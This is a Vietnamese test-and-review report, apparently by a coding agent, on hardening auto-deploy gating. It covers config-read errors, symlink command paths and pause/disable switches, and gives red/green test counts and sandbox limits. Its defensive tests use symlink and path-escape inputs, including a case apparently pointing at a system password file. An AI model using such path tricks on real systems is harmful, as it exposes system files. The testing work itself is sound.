| V2-C2 | Task 8 `cam_tu_lenh_tho`: kiểm đủ cấu trúc/kiểu/lệnh; HTTP lỗi không rơi về mặc định. `ket_thuc_xong` bắt lỗi cố định, truyền `loi_cam` tới `kiem_sau_xong`, không gọi runner, vẫn công bố và gửi bàn giao. | `tests/test_deploy_review_v2.py::test_v2_c2_loi_doc_cau_hinh_dung_truoc_runner`: GET 500, mất kết nối, JSON thiếu trường, boolean sai kiểu, lệnh sai cú pháp; script nằm trong `cho_phep`. **Đỏ: 5 failed, 1 passed**, lỗi `runner đã được gọi trước khi xác minh D89`. Sau sửa **6 passed** (kèm đối chứng cấu hình hợp lệ rỗng); kiểm bàn giao có commit thật, kết quả lệnh rỗng và không chép response/lỗi. |
| V2-Q1 | Task 8 `loai_trong_cay` dùng trực tiếp `tu_merge_rao.loai_trong_repo` của TM-2; bỏ bản exact-path/resolve-checkout. Giữ chữ ký TM-1, không sửa TM-1 hay tạo bộ nhận diện thứ ba. | `test_v2_q1_duong_lenh_khong_duoc_lot_runner` (đổi link, đổi đích, `link/..`, khác hoa/thường) và `test_v2_q1_doc_symlink_trong_commit_khong_theo_checkout` (kho bare, hai token). **Đỏ: 6 failed**, gồm runner bị gọi, thiếu lỗi đóng và `DID NOT RAISE OSError`; sau sửa **12 passed** khi chạy chung với sáu ca C2. Test cũ `lien/passwd` đổi sang kỳ vọng lỗi đóng, không còn kỳ vọng bỏ qua. |
| V2-Q2 | Task 1 `da_ghi_nhan(..., cho=...)` nhận dấu tắt mới; `tu_merge_cho_deploy` xét cả sự kiện tắt sau bản sẵn sàng. Task 4 `_buoc` truyền `cho=ly`, chỉ ghi thêm khi dấu tắt chưa được lưu. | `tests/test_deploy_cong_tac_v2.py::test_v2_q2_san_sang_tam_dung_roi_doi_cong_tac`: tạm dừng → sẵn sàng → tắt → bật/tiếp tục, có/không tick khi tắt; đối chứng chỉ tạm dừng/tiếp tục. **Đỏ: 2 failed, 1 passed**, không ghi lý do mới và `assert 1 == 0` (đã tự deploy trái D123). Sau sửa nhóm trạng thái/race/công tắc **20 passed**; đếm deploy 0/1, thử nhịp lặp không trùng và bấm tay vẫn chạy đúng một lần. |

### Kiểm chứng cuối và giới hạn môi trường

Mọi lệnh dưới đây có tiền tố `UV_CACHE_DIR=/tmp/tm3-uv UV_NO_SYNC=1`; bộ runner tự đặt
`UV_OFFLINE=1`. Không gọi mạng, không tải gói. Các số vòng 1/2 phía trên là lịch sử, không thay
bằng chứng vòng 3 này.

```bash
tests/chan_host/chay.sh -q tests/test_deploy_cam.py tests/test_deploy_review_v2.py tests/test_deploy_trang_thai.py tests/test_deploy_cong_tac_v2.py tests/test_deploy_race.py tests/test_deploy_chuoi.py tests/test_api_deploy.py tests/test_do_dai_ma.py tests/test_vong_import.py
```

- Sau áp lại **nguyên văn plan**: **74 passed in 15.10s**, 0 dòng chặn mới, 2 điểm mù Python con,
  45 push giả lập (không push thật). Đã áp 44 file và so với snapshot: **0 khác biệt byte**.
- Nền HEAD, `tests/chan_host/chay.sh -q -x`: **139 passed, 1 failed in 19.41s**.
  Sau tạm áp lát/seam: **151 passed, 1 failed in 21.28s**. Cả hai dừng tại
  `tests/test_ban_chep.py::test_ban_chep_dung_commit_co_repo_git_khong_bi_export_ignore_giau`,
  `LoiBanChep: lệnh dưới tram-kiem: không xác nhận thu hồi cây tiến trình — không công nhận`;
  đều 0 dòng chặn mới. Đây không phải kết quả hoàn tất cả bộ hay N₀ xanh.
- Kiểm hồi quy thợ phát hiện fixture cũ chưa đăng ký dự án: GET 404 từng bị mã cũ nuốt lỗi.
  Task 8 thêm hunk `tests/tho_chay_gia.py` đăng ký dự án với API ASGI giả, giữ nguyên assertion và runner thật.
  Sau sửa fixture, `tests/chan_host/chay.sh -q tests/test_tho_theo_doi_ket_thuc.py`:
  **4 passed, 2 failed in 29.80s**, 0 dòng chặn mới; hai ca còn lại là
  `test_xong_chay_lenh_kiem_cong_bo_roi_bao_xong` và `test_xong_ma_ref_bi_day_ngoai_luong_thi_bao_bi`,
  cùng `LoiThuHoi: Không dọn được nhóm lệnh kiểm; dừng khe để kiểm principal`.
- Các ca thu hồi trên **bị chặn bởi sandbox**, chưa xác minh ngoài sandbox. Phép đọc trực tiếp
  `/bin/ps -p $$ -o pid=,ppid=` cũng trả `operation not permitted: /bin/ps`. Phiên này không phát sinh
  ca lỗi riêng do bind localhost hoặc `sysctl`; không gán nhãn môi trường cho các lỗi assertion đỏ ở bảng finding.
  Không sửa primitive, bỏ assertion, hay nới an toàn để xanh. Người điều phối cần chạy lại hai lệnh
  kiểm toàn bộ/thợ trên môi trường cho phép đọc bảng tiến trình; C1/Q5/G8 của vòng trước vẫn chưa được đóng.
- Phạm vi tích hợp đã chạy: TM-1 v2 (các file nền khác HEAD), seam TM-2 `tu_merge_rao.py`,
  `tu_merge_xet.py`, `suy/tu_merge.py`, bản hợp nhất `suy/tu_dong.py`, cùng mã TM-3.
  Không tuyên bố đã chạy toàn bộ TM-2/TC hoặc đã đóng V2-C1/V2-Q3 của các lát khác.

### Ranh giới và bàn giao

- Import mới `deploy.cam → giao_viec.tu_merge_rao` dùng đúng một bộ nhận diện; test vòng import xanh.
  Không đổi hợp đồng callback TM-1, chữ ký `cam_tu_lenh(db, repo, da, commit)` dùng trong TC,
  router/schema Deploy, hay các khoá GET mà TM-4 dùng. Không đổi schema DB/dependency/quyền.
- Không thu hồi trigger chỉ vì tạm dừng; dấu tắt có tính bền qua sự kiện. Dữ liệu sẵn sàng vẫn giữ
  để Đại ca bấm Deploy. Mọi vòng lặp thử lại giữ chống trùng.
- Nội dung ngoài plan đã hoàn nguyên về HEAD, file mã/test mới tạm áp đã xoá; chỉ giữ plan này
  và báo cáo gốc `KET-QUA-CODEX.md`. Cây đầu phiên sạch, không có staged tồn đọng như ghi chú lịch sử vòng 2.
  Không commit, merge, push hoặc ghi Beads. Không có câu hỏi sản phẩm mới cần Đại ca chốt.

## Sửa trực tiếp của reviewer gộp vòng 3

V3-Q2: `tu_merge_cho_deploy` thêm tham số tuỳ chọn `ma_nguon` để xét lại đúng trigger đã chọn sau
`tao_worktree`/đọc đỉnh remote. Chỉ tạm dừng/tiếp tục không tiêu trigger; tắt/bật khi đã có bản sẵn sàng thì
hoãn, chờ bấm tay theo D123. Không dùng trigger mới hơn để thay trigger của chuỗi đang chuẩn bị;
merge đến sau vẫn giữ tập phủ riêng như test Q6. Thêm hai ca hồi quy vào `test_deploy_cong_tac_v2.py`.
Đây là sửa plan bằng đọc tĩnh, **chưa chạy test/AST/áp hunk**; số xanh của tác giả phía trên không bao gồm sửa này.
